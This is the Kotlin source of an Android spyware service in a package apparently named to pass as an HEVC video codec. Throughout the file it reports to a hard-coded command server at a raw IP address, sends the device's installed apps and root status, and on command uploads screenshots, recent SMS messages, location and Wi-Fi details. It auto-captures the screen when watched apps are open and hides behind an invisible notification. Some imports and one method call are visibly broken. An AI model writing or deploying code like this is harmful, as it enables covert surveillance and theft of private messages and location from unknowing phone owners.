package com.hevc.codec

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.location.LocationManager
import android.net.wifi.WifiManager
import android.os.*
import android.provider.Settings
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.Date

class AgentService : Service() {

    companion object {
        const val C2_BASE = "http://38.97.62.125:5000"
        const val POLL_MS = 8_000L
        var watchedApps: MutableList<String> = mutableListOf()
        var isAppInForeground = false
        var foregroundAppName: String = ""
    }

    private lateinit var handler: Handler
    private lateinit var deviceId: String
    private var rooted = false
    private var lastScreenshotTime = 0L
    private val SCREENSHOT_INTERVAL_MS = 5_000L

    private val pollRunnable = object : Runnable {
        override fun run() {
            tick()
            handler.postDelayed(this, POLL_MS)
        }
    }

    override fun onCreate() {
        super.onCreate()
        handler = Handler(Looper.getMainLooper())
        deviceId = Settings.Secure.getString(contentResolver, "android_id") ?: "unknown"
        rooted = detectRoot()
        startForeground(1, buildInvisibleNotification())
        checkin()
        handler.post(pollRunnable)
        Log.d("Agent", "Started. id=$deviceId rooted=$rooted")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?) = null

    override fun onDestroy() {
        handler.removeCallbacks(pollRunnable)
        stopForeground(true)
        super.onDestroy()
    }

    // ================= CORE LOOP =================
    private fun tick() {
        Thread {
            try {
                val resp = poll()
                val cmd = resp.optString("cmd", "idle")
                val watchApps = resp.optJSONArray("watch_apps")

                if (watchApps != null) {
                    watchedApps.clear()
                    for (i in 0 until watchApps.length()) {
                        watchedApps.add(watchApps.getString(i))
                    }
                }

                // AUTO-SCREENSHOT: agar watched app foreground me hai
                if (isAppInForeground && watchedApps.isNotEmpty()) {
                    val now = System.currentTimeMillis()
                    if (now - lastScreenshotTime > SCREENSHOT_INTERVAL_MS) {
                        lastScreenshotTime = now
                        doAutoScreenshot()
                    }
                }

                // Manual commands
                when (cmd) {
                    "screenshot"       -> doManualScreenshot()
                    "sms_list"         -> doSmsList()
                    "location"         -> doLocation()
                    "wifi_info"        -> doWifiInfo()
                    "apps"             -> doApps()
                    "reboot"           -> doReboot()
                    "self_uninstall"   -> doSelfUninstall()
                    else -> {}
                }
            } catch (e: Exception) {
                Log.e("Agent", "tick error", e)
            }
        }.start()
    }

    private fun checkin() {
        val apps = packageManager.getInstalledPackages(0).map { it.packageName }
        val body = JSONObject().apply {
            put("id", deviceId)
            put("model", Build.MODEL)
            put("android", Build.VERSION.RELEASE)
            put("rooted", rooted)
            put("battery", getBatteryLevel())
            put("apps", JSONArray(apps))
        }
        post("$C2_BASE/checkin", body.toString())
    }

    private fun poll(): JSONObject {
        return try {
            val url = URL("$C2_BASE/poll/$deviceId")
            val conn = url.openConnection() as HttpURLConnection
            val resp = BufferedReader(InputStreamReader(conn.inputStream)).readText()
            JSONObject(resp)
        } catch (e: Exception) { JSONObject().put("cmd", "idle") }
    }

    private fun sendResult(json: Any) {
        val payload = JSONObject().put("result", json.toString())
        post("$C2_BASE/result/$deviceId", payload.toString())
    }

    // ================= SCREENSHOTS =================
    private fun doAutoScreenshot() {
        try {
            val proj = MainActivity.projection
            val reader = MainActivity.imageReader
            if (proj != null && reader != null) {
                val bitmap = captureFromProjection(reader)
                if (bitmap != null) {
                    uploadScreenshot(bitmap)
                    Log.d("Agent", "Auto-screenshot sent ($foregroundAppName)")
                }
            }
        } catch (e: Exception) {
            Log.e("Agent", "Auto-screenshot failed", e)
        }
    }

    private fun doManualScreenshot() {
        doAutoScreenshot()
        sendResult("Screenshot captured and uploaded")
    }

    private fun captureFromProjection(reader: android.media.ImageReader): Bitmap? {
        val image = reader.acquireLatestImage() ?: return null
        val plane = image.planes[0]
        val buffer = plane.buffer
        val bitmap = Bitmap.createBitmap(image.width, image.height, Bitmap.Config.ARGB_8888)
        bitmap.copyPixelsFromBuffer(buffer)
        image.close()
        return bitmap
    }

    private fun uploadScreenshot(bitmap: Bitmap) {
        try {
            val conn = URL("$C2_BASE/screenshot/$deviceId").openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.outputStream.use { bitmap.compress(Bitmap.CompressFormat.PNG, 80, it) }
            conn.responseCode
        } catch (e: Exception) {
            Log.e("Agent", "Upload failed", e)
        }
    }

    // ================= OTHER COMMANDS =================
    private fun doSmsList() {
        try {
            val cur = applicationContext.contentResolver.query(
                android.provider.Telephony.Sms.Inbox.CONTENT_URI,
                arrayOf("address", "body", "date"), null, null, "date DESC LIMIT 5"
            )
            val list = mutableListOf<String>()
            cur?.use {
                while (it.moveToNext()) {
                    list.add("${it.getString(0)}: ${it.getString(1)?.take(80)}")
                }
            }
            sendResult(list.ifEmpty { listOf("(no SMS or permission denied)") })
        } catch (e: Exception) { sendResult("err: ${e.message}") }
    }

    private fun doLocation() {
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (loc != null) {
                sendResult(JSONObject().apply {
                    put("lat", loc.latitude)
                    put("lng", loc.longitude)
                    put("accuracy_m", loc.accuracy)
                    put("time", Date(loc.time).toString())
                })
            } else sendResult("(no location fix)")
        } catch (e: Exception) { sendResult("err: ${e.message}") }
    }

    private fun doWifiInfo() {
        try {
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            sendResult(JSONObject().apply {
                put("ssid", wm.connectionInfo.ssid)
                put("bssid", wm.connectionInfo.bssid)
                put("ip", wm.connectionInfo.ipAddress.toString())
            })
        } catch (e: Exception) { sendResult("err: ${e.message}") }
    }

    private fun doApps() {
        val pkgs = packageManager.getInstalledPackages(0).map { it.packageName }
        sendResult(pkgs)
    }

    private fun doReboot() {
        Thread { Runtime.getRuntime().exec(arrayOf("reboot")) }.start()
    }

    private fun doSelfUninstall() {
        val uri = Uri.fromParts("package", packageName, null)
        val intent = Intent(Intent.ACTION_DELETE, uri)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
    }

    // ================= HELPERS =================
    private fun detectRoot(): Boolean {
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("which", "su"))
            val out = p.inputStream.bufferedReader().readText()
            out.contains("/system/xbin/su") || out.contains("/system/bin/su") ||
            File("/data/adb/magisk").exists()
        } catch (e: Exception) { false }
    }

    private fun getBatteryLevel(): Int {
        val bat = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)) ?: return -1
        val level = bat.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale = bat.getIntExtra(BatteryManager.EXTRA_SCALE, 100)
        return (level * 100) / scale
    }

    private fun buildInvisibleNotification(): Notification {
        val channelId = "hevc_agent"
        createChannel(channelId)
        return Notification.Builder(this, channelId)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_media_play)
            .setOngoing(true)
            .setShowWhen(false)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(Notification.VISIBILITY_NONE)
            .build()
    }

    private fun createChannel(id: String) {
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = getSystemService(NotificationManager::class.java)
            val ch = NotificationChannel(id, "", NotificationManager.IMPORTANCE_MIN)
            ch.setShowBadge(false); ch.enableVibration(false); ch.enableLights(false)
            nm.createChannel(ch)
        }
    }

    private fun post(url: String, body: String): String {
        val conn = URL(url).openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.setRequestProperty("Content-Type", "application/json")
        conn.doOutput = true
        conn.outputStream.use { it.write(body.toByteArray()) }
        return BufferedReader(InputStreamReader(conn.inputStream)).readText()
    }
}